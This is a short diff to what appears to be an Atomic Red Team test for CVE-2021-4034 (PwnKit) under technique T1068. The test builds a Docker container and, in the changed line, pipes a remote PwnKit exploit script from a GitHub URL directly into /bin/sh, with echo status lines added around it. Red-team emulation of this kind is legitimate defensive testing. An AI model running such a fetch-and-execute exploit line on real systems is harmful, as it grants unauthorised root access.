@@ -28,8 +28,11 @@ atomic_tests:
   executor:
     command: |-
       docker build -t cve_2021_4034  /root/AtomicRedTeam/atomics/T1068/src/
+      echo "Docker build complete"
       docker run --name CVE_2021_4034_container  -d -t cve_2021_4034
-      docker exec CVE_2021_4034_container /bin/sh -c "$(curl -fsSL #{exploit_url})"
+      echo "Docker run complete"
+      docker exec CVE_2021_4034_container /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+      echo "Docker exec complete"
     cleanup_command: |-
       docker stop CVE_2021_4034_container
       docker rm CVE_2021_4034_container
